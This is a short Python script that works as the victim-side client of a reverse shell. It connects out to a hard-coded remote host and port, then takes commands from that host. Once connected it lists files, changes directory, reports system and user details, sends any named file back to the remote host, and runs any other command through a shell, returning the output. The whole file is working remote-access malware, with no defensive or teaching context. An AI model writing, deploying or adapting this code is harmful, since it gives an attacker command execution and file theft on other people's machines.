import socket
import subprocess
import os
import platform
import getpass
import base64
from time import sleep


REMOTE_HOST = '192.168.2.81' # '192.168.43.82'
REMOTE_PORT = 8080 # 2222
client = socket.socket()

print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

while True:
    try:
        header = f"""{getpass.getuser()}@{platform.node()}{os.getcwd()}$ """
        client.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = client.recv(1024).decode("utf-8")

        #get all commands
        if cmd == "help!":
            commandoutput = f"""
                Try command such as:
                command: 'list'       ---> get a list of files in the directory
                command: 'sysinfo'    ---> gives all information about client PC
                command: 'download'   ---> downloads the given file, so make sure you give a file in the command
                command: 'exit'       ---> drops the connection
                """
            client.send(commandoutput.encode())

        # List files in the dir
        if cmd == "list":
            client.send(str(os.listdir(".")).encode())

        
        # Change directory
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            client.send("Changed directory to {}".format(os.getcwd()).encode())
 
        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
            Operating System: {platform.system()}
            Computer Name: {platform.node()}
            Username: {getpass.getuser()}
            Release Version: {platform.release()}
            Processor Architecture: {platform.processor()}
            """
            client.send(sysinfo.encode())

        # Download files
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print("Sending", file_data)
                    client.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                client.send(b"DONE")
            print("Finished sending data")

        # Terminate the connection
        elif cmd == "exit":
            client.send(b"exit")
            break

        # Run any other command
        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                client.send(STDERR)
            else:
                client.send(STDOUT)

        # If the connection terminates
        if not cmd:
            print("Connection dropped")
            break
    except Exception as e:
        client.send("An error has occured: {}".format(str(e)).encode())
client.close()